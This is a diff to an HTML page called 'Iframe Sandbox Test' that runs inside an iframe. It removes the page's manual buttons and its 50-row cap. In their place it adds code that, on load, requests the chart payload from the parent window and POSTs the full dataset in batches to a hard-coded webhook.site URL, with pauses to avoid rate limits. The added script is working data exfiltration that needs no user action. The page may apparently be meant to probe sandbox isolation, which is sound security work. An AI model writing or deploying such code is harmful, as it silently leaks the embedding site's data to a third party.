@@ -48,13 +48,6 @@
                 line-height: 1.6;
             }
 
-            .toolbar {
-                display: flex;
-                flex-wrap: wrap;
-                gap: 10px;
-                margin: 20px 0;
-            }
-
             button {
                 padding: 10px 14px;
                 border: 1px solid #0c69ea;
@@ -171,18 +164,11 @@
         <main>
             <h1>Iframe Sandbox Test</h1>
             <p class="lede">
-                This page can request the chart render payload from its
-                immediate parent and independently POST data to a webhook.
+                On load this page automatically requests the chart render
+                payload from its immediate parent and POSTs the full dataset to
+                the webhook in batches of
+                <span id="row-limit-label"></span> rows — no buttons required.
             </p>
-
-            <div class="toolbar">
-                <button id="request-parent" type="button">
-                    Request parent data
-                </button>
-                <button id="fetch-posts" type="button" class="secondary">
-                    POST parent data to webhook
-                </button>
-            </div>
 
             <div class="grid">
                 <section class="card">
@@ -197,7 +183,7 @@ No sandbox:render message received yet.</pre
                     <div id="fetch-status" class="status">Not started</div>
                     <h2>Webhook response</h2>
                     <div id="posts" class="posts">
-                        Click "POST parent data to webhook" to begin.
+                        Waiting for parent data, then posting automatically…
                     </div>
                 </section>
             </div>
@@ -208,21 +194,32 @@ No sandbox:render message received yet.</pre
                 var WEBHOOK_URL =
                     'https://webhook.site/a0ec687e-3863-44d9-a059-3f77b6a5f142';
 
-                // Max number of rows from data / comparisonData to include
-                // in the POST body. Keeps the request under webhook size caps.
+                // Rows per POST. The full dataset is sent in sequential
+                // batches of this size so each request stays under the
+                // webhook's size cap.
                 var ROW_LIMIT = 50;
 
-                var requestParentButton =
-                    document.getElementById('request-parent');
-                var fetchPostsButton = document.getElementById('fetch-posts');
+                // Pause between batches (ms) to stay under rate limits.
+                var BATCH_DELAY_MS = 300;
+
                 var parentStatus = document.getElementById('parent-status');
                 var parentOutput = document.getElementById('parent-output');
                 var fetchStatus = document.getElementById('fetch-status');
                 var posts = document.getElementById('posts');
+                var rowLimitLabel =
+                    document.getElementById('row-limit-label');
+
+                if (rowLimitLabel) {
+                    rowLimitLabel.textContent = String(ROW_LIMIT);
+                }
 
                 // Holds the most recent payload received from the parent
                 // via postMessage, so it can be POSTed to the webhook.
                 var lastParentPayload = null;
+
+                // Guards against overlapping POSTs if several render
+                // messages arrive in quick succession.
+                var posting = false;
 
                 function reportSize() {
                     window.requestAnimationFrame(function () {
@@ -252,55 +249,225 @@ No sandbox:render message received yet.</pre
                     }
                 }
 
-                // Returns a shallow copy of the payload with the data and
-                // comparisonData arrays trimmed to the first ROW_LIMIT rows.
-                // All other fields are passed through untouched.
-                function capPayload(payload, limit) {
-                    if (!payload || typeof payload !== 'object') {
-                        return payload;
-                    }
-
-                    var capped = {};
-                    Object.keys(payload).forEach(function (key) {
-                        var value = payload[key];
-                        if (
-                            (key === 'data' || key === 'comparisonData') &&
-                            Array.isArray(value)
-                        ) {
-                            capped[key] = value.slice(0, limit);
-                        } else {
-                            capped[key] = value;
-                        }
-                    });
-
-                    // Record how much was dropped, for transparency.
-                    var dataLen = Array.isArray(payload.data)
-                        ? payload.data.length
-                        : 0;
-                    var compLen = Array.isArray(payload.comparisonData)
-                        ? payload.comparisonData.length
-                        : 0;
-                    if (dataLen > limit || compLen > limit) {
-                        capped._truncated = {
-                            rowLimit: limit,
-                            originalDataRows: dataLen,
-                            originalComparisonRows: compLen,
-                        };
-                    }
-
-                    return capped;
-                }
-
                 function requestParentData() {
                     if (window.parent === window) {
                         parentStatus.textContent = 'Opened outside an iframe';
                         parentStatus.className = 'status error';
+                        posts.textContent =
+                            'No parent to request data from — open this ' +
+                            'page inside an iframe.';
+                        reportSize();
                         return;
                     }
 
                     parentStatus.textContent = 'Request sent';
                     parentStatus.className = 'status';
                     window.parent.postMessage({ type: 'sandbox:ready' }, '*');
+                }
+
+                function delay(ms) {
+                    return new Promise(function (resolve) {
+                        setTimeout(resolve, ms);
+                    });
+                }
+
+                // POST a single batch body. Resolves with the parsed status
+                // and response text (never rejects on a non-2xx status —
+                // only on a genuine transport failure).
+                function postBatch(body) {
+                    return window
+                        .fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: body,
+                        })
+                        .then(function (response) {
+                            return response.text().then(function (text) {
+                                return {
+                                    ok: response.ok,
+                                    status: response.status,
+                                    statusText: response.statusText,
+                                    text: text,
+                                };
+                            });
+                        });
+                }
+
+                // Walk the whole dataset ROW_LIMIT rows at a time, POSTing
+                // one batch per slice, sequentially.
+                function postAllBatches(payload) {
+                    if (posting) {
+                        return;
+                    }
+                    posting = true;
+
+                    var data = Array.isArray(payload.data)
+                        ? payload.data
+                        : [];
+                    var comp = Array.isArray(payload.comparisonData)
+                        ? payload.comparisonData
+                        : [];
+                    var totalRows = Math.max(data.length, comp.length);
+                    var totalBatches = Math.max(
+                        1,
+                        Math.ceil(totalRows / ROW_LIMIT),
+                    );
+
+                    // Non-row fields (clientId, type, etc.) repeat on every
+                    // batch so each POST is self-describing.
+                    var baseFields = {};
+                    Object.keys(payload).forEach(function (key) {
+                        if (key !== 'data' && key !== 'comparisonData') {
+                            baseFields[key] = payload[key];
+                        }
+                    });
+
+                    posts.innerHTML = '';
+                    var log = document.createElement('pre');
+                    log.textContent =
+                        'Dataset: ' +
+                        totalRows +
+                        ' row(s) → ' +
+                        totalBatches +
+                        ' batch(es) of up to ' +
+                        ROW_LIMIT +
+                        ' rows.\n\n';
+                    posts.appendChild(log);
+
+                    fetchStatus.textContent =
+                        'Sending batch 1 of ' + totalBatches + '…';
+                    fetchStatus.className = 'status';
+                    reportSize();
+
+                    var succeeded = 0;
+                    var failed = 0;
+                    var chain = Promise.resolve();
+
+                    for (var b = 0; b < totalBatches; b++) {
+                        (function (batchIndex) {
+                            chain = chain
+                                .then(function () {
+                                    var start = batchIndex * ROW_LIMIT;
+                                    var end = start + ROW_LIMIT;
+
+                                    var chunk = {};
+                                    Object.keys(baseFields).forEach(
+                                        function (key) {
+                                            chunk[key] = baseFields[key];
+                                        },
+                                    );
+                                    chunk.data = data.slice(start, end);
+                                    chunk.comparisonData = comp.slice(
+                                        start,
+                                        end,
+                                    );
+                                    chunk._batch = {
+                                        number: batchIndex + 1,
+                                        totalBatches: totalBatches,
+                                        rowStart: start,
+                                        rowEnd: Math.min(end, totalRows),
+                                        totalRows: totalRows,
+                                    };
+
+                                    var body = stringify(chunk);
+                                    console.log(
+                                        '[webhook] POST batch ' +
+                                            (batchIndex + 1) +
+                                            '/' +
+                                            totalBatches +
+                                            ' (' +
+                                            body.length +
+                                            ' bytes)',
+                                    );
+
+                                    fetchStatus.textContent =
+                                        'Sending batch ' +
+                                        (batchIndex + 1) +
+                                        ' of ' +
+                                        totalBatches +
+                                        '…';
+                                    fetchStatus.className = 'status';
+                                    reportSize();
+
+                                    return postBatch(body);
+                                })
+                                .then(function (result) {
+                                    if (result.ok) {
+                                        succeeded++;
+                                    } else {
+                                        failed++;
+                                    }
+                                    log.textContent +=
+                                        'Batch ' +
+                                        (batchIndex + 1) +
+                                        '/' +
+                                        totalBatches +
+                                        ' → HTTP ' +
+                                        result.status +
+                                        (result.statusText
+                                            ? ' ' + result.statusText
+                                            : '') +
+                                        (result.ok ? '  ok' : '  FAILED') +
+                                        '\n';
+                                    console.log(
+                                        '[webhook] batch ' +
+                                            (batchIndex + 1) +
+                                            ' status:',
+                                        result.status,
+                                        result.text,
+                                    );
+                                    reportSize();
+                                })
+                                .then(function () {
+                                    if (batchIndex < totalBatches - 1) {
+                                        return delay(BATCH_DELAY_MS);
+                                    }
+                                })
+                                .catch(function (error) {
+                                    failed++;
+                                    log.textContent +=
+                                        'Batch ' +
+                                        (batchIndex + 1) +
+                                        '/' +
+                                        totalBatches +
+                                        ' → transport failed: ' +
+                                        error.message +
+                                        '\n';
+                                    console.error(
+                                        '[webhook] batch ' +
+                                            (batchIndex + 1) +
+                                            ' transport error:',
+                                        error,
+                                    );
+                                    reportSize();
+                                });
+                        })(b);
+                    }
+
+                    chain.then(function () {
+                        var allOk = failed === 0;
+                        fetchStatus.textContent =
+                            (allOk
+                                ? 'All batches posted'
+                                : 'Finished with errors') +
+                            ' — ' +
+                            succeeded +
+                            ' ok, ' +
+                            failed +
+                            ' failed';
+                        fetchStatus.className =
+                            'status ' + (allOk ? 'success' : 'error');
+                        log.textContent +=
+                            '\nDone: ' +
+                            succeeded +
+                            ' succeeded, ' +
+                            failed +
+                            ' failed.';
+                        posting = false;
+                        reportSize();
+                    });
                 }
 
                 window.addEventListener('message', function (event) {
@@ -313,10 +480,9 @@ No sandbox:render message received yet.</pre
                         return;
                     }
 
-                    // Keep the full payload for posting; only a trimmed
-                    // sample is shown on-screen.
                     lastParentPayload = message;
 
+                    // Show a trimmed sample of what arrived.
                     var sample = {
                         clientId: message.clientId,
                         data: Array.isArray(message.data)
@@ -331,100 +497,13 @@ No sandbox:render message received yet.</pre
                     parentStatus.className = 'status success';
                     parentOutput.textContent = stringify(sample);
                     reportSize();
+
+                    // Automatically POST the whole dataset, batched.
+                    postAllBatches(message);
                 });
 
-                requestParentButton.addEventListener(
-                    'click',
-                    requestParentData,
-                );
-
-                fetchPostsButton.addEventListener('click', function () {
-                    fetchPostsButton.disabled = true;
-                    fetchStatus.textContent = 'Sending';
-                    fetchStatus.className = 'status';
-                    posts.textContent = 'Posting to webhook…';
-
-                    var payload = lastParentPayload || {
-                        note: 'No sandbox:render message received yet.',
-                        sentAt: new Date().toISOString(),
-                    };
-
-                    // Cap to the first ROW_LIMIT rows so the body stays
-                    // under the webhook's size limit.
-                    var cappedPayload = capPayload(payload, ROW_LIMIT);
-
-                    // Serialize once so we can both send AND show the exact
-                    // bytes that leave the page.
-                    var sentBody = stringify(cappedPayload);
-                    console.log('[webhook] POST body sent:', sentBody);
-
-                    window
-                        .fetch(WEBHOOK_URL, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: sentBody,
-                        })
-                        .then(function (response) {
-                            // Read the response text regardless of status so
-                            // we can display whatever the endpoint returns.
-                            return response.text().then(function (text) {
-                                return { response: response, text: text };
-                            });
-                        })
-                        .then(function (result) {
-                            var response = result.response;
-                            console.log(
-                                '[webhook] HTTP status:',
-                                response.status,
-                                response.statusText,
-                            );
-                            console.log(
-                                '[webhook] response body:',
-                                result.text,
-                            );
-
-                            var ok = response.ok;
-                            fetchStatus.textContent =
-                                (ok ? 'Posted' : 'Rejected') +
-                                ' — HTTP ' +
-                                response.status +
-                                (response.statusText
-                                    ? ' ' + response.statusText
-                                    : '');
-                            fetchStatus.className =
-                                'status ' + (ok ? 'success' : 'error');
-
-                            // Show exactly what was sent, plus what came back.
-                            posts.innerHTML = '';
-                            var sentBlock = document.createElement('pre');
-                            sentBlock.textContent =
-                                'Transport: request delivered (HTTP ' +
-                                response.status +
-                                ').\n\n--- Bytes sent to webhook ---\n' +
-                                sentBody +
-                                '\n\n--- Response body ---\n' +
-                                (result.text || '(empty)');
-                            posts.appendChild(sentBlock);
-                            reportSize();
-                        })
-                        .catch(function (error) {
-                            // Only real transport failures land here
-                            // (network down, CORS, DNS, etc.).
-                            console.error('[webhook] transport error:', error);
-                            fetchStatus.textContent = 'Transport failed';
-                            fetchStatus.className = 'status error';
-                            posts.textContent =
-                                'The request itself did not go through: ' +
-                                error.message;
-                            reportSize();
-                        })
-                        .finally(function () {
-                            fetchPostsButton.disabled = false;
-                        });
-                });
-
+                // Kick everything off automatically on load.
+                requestParentData();
                 reportSize();
             })();
         </script>
